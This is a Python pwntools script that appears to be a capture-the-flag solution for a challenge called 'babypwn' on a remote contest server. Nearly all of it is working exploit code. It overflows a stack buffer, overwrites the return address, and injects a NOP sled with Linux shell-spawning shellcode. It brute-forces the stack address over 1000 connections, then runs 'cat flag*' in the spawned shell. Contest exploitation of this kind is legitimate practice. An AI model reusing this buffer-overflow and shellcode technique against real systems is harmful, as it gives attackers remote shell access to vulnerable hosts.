from pwn import *

context.arch = "amd64"

sh = asm(shellcraft.amd64.linux.sh())
def test(x):
    p = remote("chal.cybersecurityrumble.de",1990)
    #p = process("./babypwn", aslr=False)
    #gdb.attach(p)


    print (p.recvline())

    def a64(val):
        b = p64(val)
        b = "".join((hex(x)[2:]).rjust(2,'0') for x in b)
        return b.encode()

    buf = b''
    j = cyclic_find("faabgaabha")
    buf += ("".join([hex(i)[2:] for i in cyclic(j)])).encode()


    # 0x7fffffffddc0
    addr = 0x7fffffffddd0 + x
    print(hex(addr))
    buf += a64(addr) #a64(0x7fffffffddc0)
    sc = p8(0x90) * 0x100
    sc += sh
    sc += b"\x90" * (8 - len(sc) % 8)

    for i in range(0,len(sc),8):
        buf += a64(u64(sc[i:i+8]))

    buf += a64(0x4242424242)


    #faabgaabha
    p.sendline(buf)
    
    try:
        p.sendline("cat flag*")
        print(p.recvline())
        while 1:
            pass
    except:
        pass
    p.close()

for x in range(1000):
    test(x * 0x40)
